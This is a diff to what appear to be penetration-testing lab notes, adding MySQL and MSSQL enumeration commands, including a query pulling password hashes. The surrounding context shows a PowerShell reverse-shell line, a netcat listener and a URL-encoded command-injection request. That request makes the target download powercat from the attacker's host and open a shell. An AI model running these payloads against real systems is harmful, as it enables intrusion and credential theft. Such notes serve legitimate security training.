@@ -220,3 +220,17 @@ $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444)
   - Using a webserver to serve up: ```python3 -m http.server 80```
   - Establish the netcat listener to hold the shell: ```nc -nvlp 4444```
   - Download Powercat from our webserver and load up the reverse shell (with URL encoding): ```curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive```
+
+## SQL Injection
+
+- Connecting to mysql: ```mysql -u root -p'root' -h 192.168.50.16 -P 3306```
+  - Grab version: ```select version();```
+  - Grab current user: ```select system_user();```
+  - List databases: ```show databases;```
+  - List tables in a db: ```show tables in <db name>;```
+  - List columns in a table: ```show columns in <dbname.tablename>;```
+  - Sample query to pull data: ```SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';```
+- Connecting to MSSQL with impacket: ```impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth```
+  - Grab version: ```SELECT @@version;```
+  - List databases: ```SELECT name FROM sys.databases;``` >> master, tempdb, model, and msdb are default databases
+  - Selecting a database and listing tables: ```SELECT * FROM offsec.information_schema.tables;```
